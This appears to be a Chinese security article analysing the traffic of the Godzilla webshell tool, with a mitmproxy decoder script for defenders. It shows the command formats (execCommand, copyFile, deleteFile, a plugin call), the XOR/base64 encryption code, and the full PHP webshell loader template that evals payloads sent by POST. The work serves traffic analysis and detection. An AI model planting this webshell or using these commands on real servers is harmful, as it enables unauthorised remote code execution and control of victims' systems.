![image.png](https://image.3001.net/images/20210821/1629545996_6120e60c9177505b5bd43.png!small)通过Burp抓包分析，在Godzilla中`进入`shell的时候，类似Shell
Setting过程中`测试连接`的过程，一共发送了3个POST请求，其中前两个请求和`测试连接`中发送的请求和接收到的响应完全一致。

第1个请求：请求报文发送大量数据（实际内容为Payload），返回报文为空

![image.png](https://image.3001.net/images/20210821/1629546134_6120e6964b7255b5251d3.png!small)

第2个：请求报文发送很少数据（实际内容为测试连接命令`test`），返回少量数据（即`ok`）

![image.png](https://image.3001.net/images/20210821/1629546214_6120e6e673325d031e429.png!small)![image.png](https://image.3001.net/images/20210821/1629546230_6120e6f6d0c9e4d45c1bc.png!small)

第3个请求：请求报文为获取服务器`基础信息`的命令`getBasicsInfo`，返回服务器基础信息

![image.png](https://image.3001.net/images/20210821/1629546346_6120e76ae9624a70145e6.png!small)![image.png](https://image.3001.net/images/20210821/1629546360_6120e77890316ead3ff8b.png!small)

单请求命令

哥斯拉的大部分操作都是单请求命令，例如`文件管理`中的`文件浏览`功能。  
![image.png](https://image.3001.net/images/20210821/1629546455_6120e7d7051a2146fb4d9.png!small)![image.png](https://image.3001.net/images/20210821/1629546471_6120e7e78d844fb94b437.png!small)哥斯拉的大部分功能都是单请求命令，例如以下3个命令，其他的命令大家可以自行探索：

命令执行：`{'cmdLine': 'ls', 'methodName': 'execCommand'}`

复制文件：`{'destFileName': '目标文件名.php', 'methodName': 'copyFile', 'srcFileName':
'原始文件名.php'}`

删除文件：`{'fileName': '待删除文件.php', 'methodName': 'deleteFile'}`

#### 多请求命令

哥斯拉还有部分命令是多请求命令，例如`代码执行`功能。在执行该功能时，类似shell连接过程，先发送一个POST请求将该功能相关的Payload发送到服务器，然后再发送第二个请求完成`代码执行`过程。

第1个请求：发送代码执行相关的payload，返回`ok`

![image.png](https://image.3001.net/images/20210821/1629547083_6120ea4b782e06a85c527.png!small)

第2个请求：发送需要执行的代码，返回代码执行结果

![image.png](https://image.3001.net/images/20210821/1629547101_6120ea5d71763b91654cc.png!small)哥斯拉中通过插件实现的功能大多都是多请求命令，例如：

第1个请求：`{'codeName': 'plugin.ByPassOpenBasedir', 'binCode':
'$session=&getSession();\r\n$session["bypass_open_basedir"]=true;\r\nreturn
"ok";\r\n', 'methodName': 'includeCode'}`

第2个请求：`{'codeName': 'plugin.ByPassOpenBasedir', 'methodName': 'run'}`

## PHP_EVAL_XOR_BASE64加密shell分析

哥斯拉不同的加密器发送请求的过程都是一样的，不同之处在于加密/解密的实现方式不同。`PHP_EVAL_XOR_BASE64`加密shell的加解密实现代码在`src/shells/cryptions/phpXor/PhpEvalXor.java`文件中（`C#`、`Java`、`PHP`以及不同的加密方式分别对应不同的源文件），涉及加解密的代码如下：

    
    
    public byte[] encode(byte[] data) {
       try {
          return this.E(data);
       } catch (Exception var3) {
          Log.error(var3);
          return null;
       }}
    
    public byte[] decode(byte[] data) {
       if (data != null && data.length > 0) {
          try {
             return this.D(this.findStr(data));
          } catch (Exception var3) {
             Log.error(var3);
             return null;
          }   } else {
          return data;
       }}
    
    public boolean isSendRLData() {
       return true;
    }
    
    public byte[] E(byte[] cs) {
       int len = cs.length;
    
       for(int i = 0; i < len; ++i) {
          cs[i] ^= this.key[i + 1 & 15];
       }
       return (String.format("%s=%s&", this.pass, this.evalContent) + this.shell.getSecretKey() + "=" + URLEncoder.encode(functions.base64Encode(cs))).getBytes();
    }
    
    public byte[] D(String data) {
       byte[] cs = functions.base64Decode(data);
       int len = cs.length;
    
       for(int i = 0; i < len; ++i) {
          cs[i] ^= this.key[i + 1 & 15];
       }
       return cs;
    }
    
    public String findStr(byte[] respResult) {
       String htmlString = new String(respResult);
       return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
    }
    
    // 生成evalContent的过程
    public String generateEvalContent() {
       String eval = (new String(Generate.GenerateShellLoder(this.shell.getSecretKey(), functions.md5(this.shell.getSecretKey()).substring(0, 16), false))).replace("<?php", "");
       eval = functions.base64Encode(eval.getBytes());
       eval = (new StringBuffer(eval)).reverse().toString();
       eval = String.format("eval(base64_decode(strrev(urldecode('%s'))));", URLEncoder.encode(eval));
       eval = URLEncoder.encode(eval);
       return eval;
    }
    

`PHP_EVAL_XOR_BASE64`加密shell的特点如下：

请求数据加密得到的密文形式：`pass=evalContent&test1234=XXXXXXXX`，其中`pass`是shell密码，`test1234`是shell密钥

每个请求中的`pass=evalContent`都是相同的，`evalContent`是将`src/shells/cryptions/phpXor/template/base64.bin`文件内容经过编码得到的（先删除第1行的`<?php`，再将其中的`{pass}`替换为`shell密码`，将`{secretKey}`替换为`shell密钥`）

每个请求中的`test1234=XXXXXXXX`才是实际执行的shell操作，加密方法和`PHP_XOR_BASE64`加密shell的请求加密方式一样

`evalContent`的加密过程如下：

提取`src/shells/cryptions/phpXor/template/base64.bin`文件内容；

将`base64.bin`文件内容进行`base64`编码；

将第2步中编码得到的字符串逆序排列；

将第3步中得到的字符串进行`URL`编码；

将第4步中得到的字符串拼接到`eval(base64_decode(strrev(urldecode('第4步中得到的字符串'))));`中，即为最终的`evalContent`。

![image.png](https://image.3001.net/images/20210821/1629549597_6120f41da73c23a69599f.png!small)`src/shells/cryptions/phpXor/template/base64.bin`文件内容如下所示：

    
    
    <?php
    @session_start();
    @set_time_limit(0);
    @error_reporting(0);
    function encode($D,$K){
        for($i=0;$i<strlen($D);$i++) {
            $c = $K[$i+1&15];
            $D[$i] = $D[$i]^$c;
        }
        return $D;
    }
    $pass='{pass}';
    $payloadName='payload';
    $key='{secretKey}';
    if (isset($_POST[$pass])){
        $data=encode(base64_decode($_POST[$pass]),$key);
        if (isset($_SESSION[$payloadName])){
            $payload=encode($_SESSION[$payloadName],$key);
            eval($payload);
            echo substr(md5($pass.$key),0,16);
            echo base64_encode(encode(@run($data),$key));
            echo substr(md5($pass.$key),16);
        }else{
            if (stripos($data,"getBasicsInfo")!==false){
                $_SESSION[$payloadName]=encode($data,$key);
            }
        }
    }
    

服务器响应数据的解密过程和`PHP_XOR_BASE64`加密shell完全一致。

# PHP_XOR_RAW加密shell分析

`PHP_XOR_RAW`加密shell的加解密实现代码在`src/shells/cryptions/phpXor/PhpXorRaw.java`文件中（`C#`、`Java`、`PHP`以及不同的加密方式分别对应不同的源文件），涉及加解密的代码如下：

    
    
    public byte[] encode(byte[] data) {
       try {
          return this.E(data);
       } catch (Exception var3) {
          Log.error(var3);
          return null;
       }}
    
    public byte[] decode(byte[] data) {
       if (data != null && data.length > 0) {
          try {
             return this.D(data);
          } catch (Exception var3) {
             Log.error(var3);
             return null;
          }   } else {
          return data;
       }}
    
    public boolean isSendRLData() {
       return false;
    }
    
    public byte[] E(byte[] cs) {
       int len = cs.length;
    
       for(int i = 0; i < len; ++i) {
          cs[i] ^= this.key[i + 1 & 15];
       }
       return cs;
    }
    
    public byte[] D(byte[] cs) {
       int len = cs.length;
    
       for(int i = 0; i < len; ++i) {
          cs[i] ^= this.key[i + 1 & 15];
       }
       return cs;
    }
    

由上述代码可知，`PHP_XOR_RAW`加密shell的加解过程只是将原始数据与shell密钥（本例中为`test1234`）md5值的前16位（本例中为`16d7a4fca7442dda`）按位异或，然后将得到的二进制字节码直接发送给服务器；服务器返回的响应数据也是二进制字节码，左右不再追加任何数据。  
![image.png](https://image.3001.net/images/20210821/1629550896_6120f9301b5c1803092f7.png!small)![image.png](https://image.3001.net/images/20210821/1629551031_6120f9b75416a9d8a9e8c.png!small)

# PhpDynamicPayload加密shell分析辅助脚本

为了方便分析哥斯拉的流量，本人写了一个哥斯拉加密shell流量分析辅助脚本。该脚本基于
**[mitmproxy](https://mitmproxy.org/)，是`mitmproxy`的`addon`脚本。**  
目前支持
**[哥斯拉3.0.3](https://github.com/BeichenDream/Godzilla/releases/tag/v3.03-godzilla)`PhpDynamicPayload`的三种加密器：**

> PHP_XOR_BASE64
>
> PHP_EVAL_XOR_BASE64
>
> PHP_EVAL_RAW

项目地址：<https://github.com/think3t/godzilla_decoder>  
使用效果：  
![image-20210822000900377.png](https://image.3001.net/images/20210822/1629563968_61212c40e06dadc149ad5.png!small)![image-20210822001433710.png](https://image.3001.net/images/20210822/1629563978_61212c4a04801714f7b0c.png!small)![image-20210822001800886.png](https://image.3001.net/images/20210822/1629563984_61212c50c73b387d01b91.png!small)![image-20210822002109141.png](https://image.3001.net/images/20210822/1629563993_61212c5943d97d89be702.png!small)

